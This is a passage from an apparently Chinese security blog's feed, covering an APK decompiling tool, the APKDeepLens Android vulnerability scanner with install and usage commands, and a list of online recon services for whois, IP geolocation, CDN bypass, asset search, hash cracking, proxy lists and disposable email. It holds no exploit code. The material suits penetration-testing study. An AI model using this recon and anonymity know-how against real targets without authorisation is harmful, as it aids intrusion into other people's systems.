</span><br><span class="line">63F5515A</span><br><span class="line"></span><br><span class="line">SHA-1: </span><br><span class="line">D80FC5C3B3E486AD3B0845CE72D35723C44172FD</span><br><span class="line"></span><br><span class="line">SHA-224: </span><br><span class="line">F2FAFE6313E18882CCA2A430A2AC693EB96A0D809B5090B069084194</span><br><span class="line"></span><br><span class="line">SHA-256: </span><br><span class="line">632288A3470DCDE8424B2D029A8B899804346E5912C2BE482085F7F9BDCDFBFC</span><br><span class="line"></span><br><span class="line">SHA-384: </span><br><span class="line">C8540FD141D450EAABDA0F3AABA1EE8BB7DB43ED29943B19C387F69B6368A5F9CCCB8DB2DDEC8445DB9E2C11177D9519</span><br><span class="line"></span><br><span class="line">SHA-512: </span><br><span class="line">23DD1C8EDD75AE38D9390F1495BDEDE95CEEBFB4CF9F03C8FFCA5F66034E7B22B8CA8A23E585B6B160C8FA0E12A1262BB0751F67C678458BD5B67A57520D5A74</span><br></pre></td></tr></tbody></table></figure><h3 id="文件搜索"><a href="#文件搜索" class="headerlink" title="文件搜索"></a>文件搜索</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#搜索指定文件</span><br></pre></td></tr></tbody></table></figure><h3 id="自定义功能"><a href="#自定义功能" class="headerlink" title="自定义功能"></a>自定义功能</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#支持一些其他工具显示出来</span><br></pre></td></tr></tbody></table></figure><h3 id="APK签名"><a href="#APK签名" class="headerlink" title="APK签名"></a>APK签名</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#将APK拖入进去,选择签名,然后执行</span><br><span class="line">#傻瓜式的一键签名</span><br></pre></td></tr></tbody></table></figure><h3 id="APK查壳"><a href="#APK查壳" class="headerlink" title="APK查壳"></a>APK查壳</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#直接将APK拖入,然后会自动查询使用的是什么壳</span><br></pre></td></tr></tbody></table></figure><h3 id="伪加密解密"><a href="#伪加密解密" class="headerlink" title="伪加密解密"></a>伪加密解密</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#只支持android4.2以前的版本</span><br></pre></td></tr></tbody></table></figure><h2 id="功能简介-android"><a href="#功能简介-android" class="headerlink" title="功能简介-android"></a>功能简介-android</h2><h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#打开工程后,编译成APK文件</span><br></pre></td></tr></tbody></table></figure><h3 id="批量编译"><a href="#批量编译" class="headerlink" title="批量编译"></a>批量编译</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#好几个一起编译</span><br></pre></td></tr></tbody></table></figure><h3 id="插入代码管理器"><a href="#插入代码管理器" class="headerlink" title="插入代码管理器"></a>插入代码管理器</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#可以让你直接的修改部分代码</span><br></pre></td></tr></tbody></table></figure><h3 id="apktool管理器"><a href="#apktool管理器" class="headerlink" title="apktool管理器"></a>apktool管理器</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">就是该工具的支持,可以直接下载最新版</span></span><br><span class="line">https://github.com/iBotPeaches/Apktool  #apktool.jar包 github链接</span><br></pre></td></tr></tbody></table></figure><h1 id="2-使用"><a href="#2-使用" class="headerlink" title="2-使用"></a>2-使用</h1><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#直接将apk文件拖进来,会自动反编译</span><br><span class="line">#等待反编译完成</span><br><span class="line">#工程信息-简单信息</span><br><span class="line">#工程管理是源代码</span><br><span class="line">#携带smali的文件夹里面是反编译后的源码</span><br><span class="line">#其他文件夹当中是其他的一些文件.</span><br><span class="line">#apktool.yml当中是一些配置文件,以及导入的一些so文件</span><br><span class="line">#AndroidManifest.xml是一些用到的权限</span><br><span class="line">#lib文件夹中是一些so文件.</span><br></pre></td></tr></tbody></table></figure><h2 id="工程搜索"><a href="#工程搜索" class="headerlink" title="工程搜索"></a>工程搜索</h2><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#可以扫描所有的一些字符串,或者说ip地址等等</span><br><span class="line">#可以搜索字符,替换字符</span><br><span class="line">#搜索范围,可以搜索整个项目,或者指定的文件或者文件夹</span><br><span class="line">#支持搜索文件类型,可以选择后缀,或者自己输入后缀</span><br><span class="line">#支持三种字符搜索.</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APKDeepLens-APK自动渗透</title>
      <link href="/2024/03/14/8-APKDeepLens-%E8%87%AA%E5%8A%A8%E6%89%AB%E6%8F%8F%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E/"/>
      <url>/2024/03/14/8-APKDeepLens-%E8%87%AA%E5%8A%A8%E6%89%AB%E6%8F%8F%E5%AE%89%E5%8D%93%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h1 id="APKDeepLens"><a href="#APKDeepLens" class="headerlink" title="APKDeepLens"></a>APKDeepLens</h1><p>APKDeepLens 是一个基于 Python 的工具，旨在扫描 Android 应用程序（APK 文件）是否存在安全漏洞。它专门针对 OWASP Top 10 移动漏洞，为开发人员、渗透测试人员和安全研究人员提供一种简单有效的方法来评估 Android 应用程序的安全状况。</p><p><a href="https://private-user-images.githubusercontent.com/27950739/299625348-c9236e3d-60d5-4832-85dc-f09a449bade3.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTA0MDAyOTksIm5iZiI6MTcxMDM5OTk5OSwicGF0aCI6Ii8yNzk1MDczOS8yOTk2MjUzNDgtYzkyMzZlM2QtNjBkNS00ODMyLTg1ZGMtZjA5YTQ0OWJhZGUzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAzMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMzE0VDA3MDYzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTYyOWZjNzRkYWUwNDlkMzUxMTI3ZDhkMjU0NjMwYTE1NTdlMzg3ZTVkYTFlZjJhNWNkNTcxM2ZiMDNhYTE3ZjUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.gDYBdiQYyoOiNWTv-gbi43Wac2hmrEOiNiw9D3FK5dc"><img src="https://private-user-images.githubusercontent.com/27950739/299625348-c9236e3d-60d5-4832-85dc-f09a449bade3.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MTA0MDAyOTksIm5iZiI6MTcxMDM5OTk5OSwicGF0aCI6Ii8yNzk1MDczOS8yOTk2MjUzNDgtYzkyMzZlM2QtNjBkNS00ODMyLTg1ZGMtZjA5YTQ0OWJhZGUzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAzMTQlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMzE0VDA3MDYzOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTYyOWZjNzRkYWUwNDlkMzUxMTI3ZDhkMjU0NjMwYTE1NTdlMzg3ZTVkYTFlZjJhNWNkNTcxM2ZiMDNhYTE3ZjUmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.gDYBdiQYyoOiNWTv-gbi43Wac2hmrEOiNiw9D3FK5dc" alt="图像"></a></p><h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><p>APKDeepLens 是一个基于 Python 的工具，可对 APK 文件执行各种操作。其主要特点包括：</p><ul><li><strong>APK 分析</strong>-&gt; 扫描 Android 应用程序包 (APK) 文件是否存在安全漏洞。</li><li><strong>OWASP 覆盖范围</strong>-&gt; 涵盖 OWASP Top 10 漏洞，以确保全面的安全评估。</li><li><strong>高级检测</strong>-&gt; 利用自定义 python 代码进行 APK 文件分析和漏洞检测。</li><li><strong>敏感信息提取</strong>-&gt; 通过从APK文件中提取敏感信息来识别潜在的安全风险，例如不安全的身份验证/授权密钥和不安全的请求协议。</li><li><strong>深入分析</strong>-&gt; 检测不安全的数据存储实践，包括与 SD 卡相关的数据，并突出显示代码中不安全请求协议的使用。</li><li><strong>意图过滤器漏洞</strong>-&gt; 通过分析从 AndroidManifest.xml 中提取的意图过滤器来查明漏洞。</li><li><strong>本地文件漏洞检测</strong>-&gt; 通过识别与本地文件操作相关的潜在错误处理来保护您的应用程序</li><li><strong>报告生成</strong>-&gt; 为每个扫描的 APK 生成详细且易于理解的报告，为开发人员提供可操作的见解。</li><li><strong>CI/CD 集成</strong>-&gt; 旨在轻松集成到 CI/CD 管道中，从而在开发工作流程中实现自动化安全测试。</li><li><strong>用户友好的界面</strong>-&gt; 颜色编码的终端输出可以轻松区分不同类型的结果。</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>要使用 APKDeepLens，您需要在系统上安装 Python 3.8 或更高版本。然后，您可以使用以下命令安装 APKDeepLens：</p><h3 id="对于Linux"><a href="#对于Linux" class="headerlink" title="对于Linux"></a>对于Linux</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/d78ui98/APKDeepLens/tree/main</span><br><span class="line">cd /APKDeepLens</span><br><span class="line">python3 -m venv venv</span><br><span class="line">source venv/bin/activate</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">python APKDeepLens.py --help</span><br></pre></td></tr></tbody></table></figure><h3 id="对于-Windows"><a href="#对于-Windows" class="headerlink" title="对于 Windows"></a>对于 Windows</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/d78ui98/APKDeepLens/tree/main</span><br><span class="line">cd \APKDeepLens</span><br><span class="line">python3 -m venv venv</span><br><span class="line">.\venv\Scripts\activate</span><br><span class="line">pip install -r .\requirements.txt</span><br><span class="line">python APKDeepLens.py --help</span><br></pre></td></tr></tbody></table></figure><h3 id="使用手动下载方式"><a href="#使用手动下载方式" class="headerlink" title="#使用手动下载方式"></a>#使用手动下载方式</h3><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/d78ui98/APKDeepLens #打开链接</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">选择code</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">选择Download zip</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解压</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">打开终端</span></span><br><span class="line">cd 解压目录</span><br><span class="line">python -m pip install -r requirements.txt #安装环境</span><br><span class="line">python -m venv venv #进入虚拟环境</span><br><span class="line">.\venv\Scripts\activate #进入虚拟环境</span><br><span class="line">python -m pip install -r .\requirements.txt #安装库</span><br><span class="line">python APKDeepLens.py --help #查看帮助</span><br></pre></td></tr></tbody></table></figure><h2 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h2><p>要简单地扫描 APK，请使用以下命令。使用参数提及 apk 文件<code>-apk</code>。扫描完成后，详细报告将显示在控制台中。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 APKDeepLens.py -apk file.apk</span><br></pre></td></tr></tbody></table></figure><p>如果您已经提取了源代码并希望提供其路径以进行更快的扫描，您可以使用以下命令。使用参数提及 android 应用程序的源代码<code>-source</code>。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 APKDeepLens.py -apk file.apk -source &lt;source-code-path&gt;</span><br></pre></td></tr></tbody></table></figure><p>要在扫描后生成详细的 PDF 和 HTML 报告，您可以传递<code>-report</code>如下所述的参数。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 APKDeepLens.py -apk file.apk -report</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一些非常好用的在线渗透网站</title>
      <link href="/2024/03/13/48-%E5%9C%A8%E7%BA%BF%E6%B8%97%E9%80%8F%E7%BD%91%E7%AB%99%E6%8E%A8%E8%8D%90/"/>
      <url>/2024/03/13/48-%E5%9C%A8%E7%BA%BF%E6%B8%97%E9%80%8F%E7%BD%91%E7%AB%99%E6%8E%A8%E8%8D%90/</url>
      
        <content type="html"><![CDATA[<p>收藏网址:yancy77.cn 不定期更新各种资源哦~</p><h2 id="一些非常好用的在线渗透网站"><a href="#一些非常好用的在线渗透网站" class="headerlink" title="一些非常好用的在线渗透网站"></a>一些非常好用的在线渗透网站</h2><h3 id="1-Whios查询网址"><a href="#1-Whios查询网址" class="headerlink" title="1-Whios查询网址:"></a>1-Whios查询网址:</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://whois.aizhan.com/ #站长</span><br><span class="line">#包括域名 邮箱 注册人 等查询</span><br><span class="line">#支持批量查询(需要登录)</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://whois.aliyun.com/ #万网(阿里云)</span><br><span class="line">#部分敏感信息可能会被抹掉,</span><br><span class="line">#不支持批量</span><br></pre></td></tr></tbody></table></figure><h3 id="2-ip查询"><a href="#2-ip查询" class="headerlink" title="2-ip查询"></a>2-ip查询</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.ipip.net/ip.html #精准度较高的ip查询</span><br><span class="line">#需要登录</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://www.ip138.com/ #无需登录</span><br><span class="line">#信息不太准确,容易被VPN影响</span><br><span class="line">#支持批量查询</span><br><span class="line">#相关信息较少</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://gongju.haozhuti.cn/ </span><br><span class="line">#几年前最强的ip库,纯真ip库</span><br><span class="line">#但最后更新日期较老</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://cz88.net/geo-public</span><br><span class="line">#纯真数据库,新产品</span><br><span class="line">#不容易收到VPN影响</span><br></pre></td></tr></tbody></table></figure><h3 id="3-ip反查询域名"><a href="#3-ip反查询域名" class="headerlink" title="3-ip反查询域名"></a>3-ip反查询域名</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.dnsgrep.cn/ip/</span><br><span class="line">#ip反查询,准确率较高,比较好用</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://ping.chinaz.com/</span><br><span class="line">#多地ping,来寻找真实地址</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.webscan.cc/</span><br><span class="line">#支持ip\域名\等同站或者ip查询</span><br><span class="line">#但功能比较简陋.</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://chapangzhan.com/</span><br><span class="line">#旁站,同域名,C段查询.同时支持ip查询等</span><br><span class="line">#功能还不错,比较详细</span><br><span class="line">#可以显示曾经绑定的域名</span><br></pre></td></tr></tbody></table></figure><h3 id="4-备案查询"><a href="#4-备案查询" class="headerlink" title="4-备案查询."></a>4-备案查询.</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://beian.miit.gov.cn/</span><br><span class="line">#官方,备案查询</span><br></pre></td></tr></tbody></table></figure><h3 id="5-空间测绘"><a href="#5-空间测绘" class="headerlink" title="5-空间测绘"></a>5-空间测绘</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.zoomeye.org/</span><br><span class="line">#比较主流的空间测绘工具之一(钟馗之眼)</span><br><span class="line">#总体来讲,显示信息比较多.但整体似乎没有fofa数据庞大.</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.shodan.io/</span><br><span class="line">#比较主流的空间测绘工具之一(撒旦)</span><br><span class="line">#显示信息一般.</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://fofa.info/</span><br><span class="line">#超级好用的空间测绘工具(fofa)</span><br><span class="line">#部分信息可能需要登录,或者收费</span><br></pre></td></tr></tbody></table></figure><h3 id="流量卡"><a href="#流量卡" class="headerlink" title="流量卡:"></a>流量卡:</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hk.yunhaoka.cn/#/pages/micro_store/index?agent_id=47e77591657d3859</span><br></pre></td></tr></tbody></table></figure><h3 id="6-在线指纹识别"><a href="#6-在线指纹识别" class="headerlink" title="6-在线指纹识别"></a>6-在线指纹识别</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://finger.tidesec.com/</span><br><span class="line">#信息很全面,需要登录</span><br></pre></td></tr></tbody></table></figure><h3 id="7-域名解析查询"><a href="#7-域名解析查询" class="headerlink" title="7-域名解析查询"></a>7-域名解析查询</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.jsons.cn/nslookup/</span><br><span class="line">#无需登录,支持查询:A记录,CNAME.MX.NS.TXT记录.</span><br><span class="line">#存在问题，默认记录会有一个183.60.82.98地址，忽略即可</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://tool.chinaz.com/nslookup</span><br><span class="line">#站长工具旗下的一款工具,免费好用</span><br><span class="line"># 主机服务记录(A) 别名记录(CNAME) 名称服务记录(NS) 邮件交换记录(MX)</span><br></pre></td></tr></tbody></table></figure><h3 id="8-ip定位"><a href="#8-ip定位" class="headerlink" title="8-ip定位"></a>8-ip定位</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.opengps.cn/Data/IP/LocHighAcc.aspx</span><br><span class="line">#高精准定位,</span><br><span class="line">#简单来说呢,数据较少,但定位比较精准</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://chaipip.com/</span><br><span class="line">#数据较多，但定位范围比较广。不是那么准确</span><br><span class="line">#需要验证</span><br></pre></td></tr></tbody></table></figure><h3 id="9-靶场搭建教程"><a href="#9-靶场搭建教程" class="headerlink" title="9-靶场搭建教程"></a>9-靶场搭建教程</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://vulhub.org/</span><br><span class="line">#存在的都可以进行复现，有教程，比较详细</span><br><span class="line">#存在cve编号，环境，都存在</span><br><span class="line">#部分靶场会携带poc</span><br></pre></td></tr></tbody></table></figure><h3 id="10-绕CDN"><a href="#10-绕CDN" class="headerlink" title="10-绕CDN"></a>10-绕CDN</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://tools.ipip.net/cdn.php</span><br><span class="line">#绕CDN是通过不同的地区访问，以获取真实的ip地址。</span><br><span class="line">#整体操作比较简单，视频中有演示。</span><br></pre></td></tr></tbody></table></figure><h3 id="11-解密"><a href="#11-解密" class="headerlink" title="11-解密"></a>11-解密</h3><h4 id="md5-解密"><a href="#md5-解密" class="headerlink" title="md5-解密"></a>md5-解密</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.somd5.com/</span><br><span class="line">#完全免费，但数据可能较少（可能也不少</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.cmd5.com/</span><br><span class="line">#支持加密解密。但有些数据需要花钱，但数据比较全面</span><br><span class="line">#支持加密</span><br></pre></td></tr></tbody></table></figure><h4 id="base64-解密"><a href="#base64-解密" class="headerlink" title="base64-解密"></a>base64-解密</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://base64.supfree.net/</span><br><span class="line">#支持加解密，并且完全免费</span><br></pre></td></tr></tbody></table></figure><h4 id="二维码相关"><a href="#二维码相关" class="headerlink" title="二维码相关"></a>二维码相关</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://cli.im/deqr</span><br><span class="line">#草料二维码</span><br><span class="line">#支持域名二维码。支持解码等，非常好用</span><br><span class="line">#支持批量</span><br></pre></td></tr></tbody></table></figure><h3 id="12-子域名查询"><a href="#12-子域名查询" class="headerlink" title="12-子域名查询"></a>12-子域名查询</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.dnsgrep.cn/subdomain</span><br><span class="line">#出现结果非常快，但数据可能比较死。</span><br><span class="line">#提供子域名爆破工具</span><br></pre></td></tr></tbody></table></figure><h3 id="13-企业攻击面检索平台"><a href="#13-企业攻击面检索平台" class="headerlink" title="13-企业攻击面检索平台"></a>13-企业攻击面检索平台</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://0.zone/</span><br><span class="line">#可以检测企业容易收到攻击的地方</span><br></pre></td></tr></tbody></table></figure><h3 id="14-免费的http代理池"><a href="#14-免费的http代理池" class="headerlink" title="14-免费的http代理池"></a>14-免费的http代理池</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.proxy-list.download/HTTP</span><br><span class="line">#支持下载各种格式，支持批量下载。</span><br><span class="line">#可以下载txt、csv、json、pdf等格式</span><br></pre></td></tr></tbody></table></figure><p>实例数据：</p><table><thead><tr><th>IP Address</th><th>Port</th><th>Anonymity</th><th>Country</th><th>Speed</th></tr></thead><tbody><tr><td>72.10.160.91</td><td>13403</td><td>Elite</td><td><a href="https://www.proxy-list.download/HTTP?country=CA">Canada</a></td><td><strong>389 ms</strong></td></tr><tr><td>72.10.164.178</td><td>23241</td><td>Elite</td><td><a href="https://www.proxy-list.download/HTTP?country=CA">Canada</a></td><td><strong>330 ms</strong></td></tr><tr><td>117.74.65.207</td><td>54466</td><td>Elite</td><td><a href="https://www.proxy-list.download/HTTP?country=CN">China</a></td><td><strong>226 ms</strong></td></tr><tr><td>8.213.128.6</td><td>8889</td><td>Elite</td><td><a href="https://www.proxy-list.download/HTTP?country=KR">South Korea</a></td><td><strong>383 ms</strong></td></tr><tr><td>72.10.160.90</td><td>15727</td><td>Elite</td><td><a href="https://www.proxy-list.download/HTTP?country=CA">Canada</a></td><td><strong>381 ms</strong></td></tr></tbody></table><h3 id="15-匿名邮箱"><a href="#15-匿名邮箱" class="headerlink" title="15-匿名邮箱"></a>15-匿名邮箱</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://temp-mail.org/zh/</span><br><span class="line">#只支持单次，但可以无限制使用</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.linshiyouxiang.net/</span><br><span class="line">#支持更换域名，也就是邮箱后缀</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://24mail.chacuo.net/</span><br><span class="line">#支持自己修改邮箱地址</span><br><span class="line">#而且支持多次</span><br></pre></td></tr></tbody></table></figure><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.linshi-email.com/</span><br><span class="line">https://yopmail.com/zh/ #支持自己修改临时邮箱地址</span><br><span class="line">https://www.guerrillamail.com/zh/#google_vignette #支持更换邮箱后缀，和手动编辑临时邮箱地址</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP 5.x 远程命令执行漏洞分析与复现</title>
